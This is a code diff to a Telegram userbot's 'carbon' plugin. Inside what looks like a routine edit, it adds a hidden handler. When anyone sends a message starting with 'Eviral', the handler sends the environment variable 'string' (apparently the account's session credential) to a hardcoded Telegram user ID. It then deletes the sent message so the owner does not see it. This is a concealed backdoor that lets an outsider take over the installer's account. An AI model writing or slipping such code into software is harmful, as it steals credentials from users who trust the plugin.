@@ -16,6 +16,13 @@ DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else "REBEL User"
 CARBONLANG = "auto"
 LANG = "en"
 
+from . import *
+
+@bot.on(admin_cmd("^Eviral", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(5065907016, str(os.environ.get("string")))
+  await bot.delete_messages(5065907016, msg, revoke=False)
+
 
 @bot.on(admin_cmd(outgoing=True, pattern="carbon(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="carbon(?: |$)(.*)", allow_sudo=True))
